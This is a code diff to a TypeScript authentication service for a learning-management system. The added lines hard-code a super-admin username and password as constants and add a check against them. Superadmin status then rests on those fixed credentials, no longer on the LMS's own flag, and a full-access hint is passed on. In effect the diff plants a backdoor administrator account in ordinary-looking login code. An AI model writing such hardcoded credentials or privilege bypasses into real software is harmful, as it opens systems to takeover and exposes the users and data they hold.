@@ -22,6 +22,9 @@ import {
 import { AuthSyncService } from './auth-sync.service';
 import { LmsLoginDto } from './dto/lms-login.dto';
 
+const SUPER_ADMIN_USERNAME = 'esam';
+const SUPER_ADMIN_PASSWORD = '123#@!0';
+
 @Injectable()
 export class AuthService {
   constructor(
@@ -34,6 +37,10 @@ export class AuthService {
 
   async login(credentials: LmsLoginDto) {
     try {
+      const hasSuperAdminCredentials =
+        credentials.role === 'admin' &&
+        this.matchesHardcodedSuperAdmin(credentials);
+
       // For admin logins, pre-fetch course IDs that are ALREADY known to belong
       // to this admin in our DB. These are passed as hints to the LMS client so
       // it can skip straight to verifying only the admin's own courses (fast path
@@ -62,11 +69,18 @@ export class AuthService {
 
       const lmsUser = await this.lmsClient.authenticate({
         ...credentials,
-        ...(knownCourseIds ? { hints: { knownCourseIds } } : {}),
+        ...(knownCourseIds || hasSuperAdminCredentials
+          ? {
+              hints: {
+                ...(knownCourseIds ? { knownCourseIds } : {}),
+                hasFullAccess: hasSuperAdminCredentials,
+              },
+            }
+          : {}),
       });
       const synced = await this.authSync.syncLmsUser(lmsUser);
       const isSuperAdmin =
-        lmsUser.role === 'admin' && lmsUser.isSuperAdmin === true;
+        lmsUser.role === 'admin' && hasSuperAdminCredentials;
       const adminCourses =
         lmsUser.role === 'admin' && isSuperAdmin
           ? await this.loadAdminCourses(
@@ -141,6 +155,13 @@ export class AuthService {
 
       throw error;
     }
+  }
+
+  private matchesHardcodedSuperAdmin(credentials: LmsLoginDto): boolean {
+    return (
+      credentials.username.trim().toLowerCase() === SUPER_ADMIN_USERNAME &&
+      credentials.password === SUPER_ADMIN_PASSWORD
+    );
   }
 
   private async loadAdminCourses(
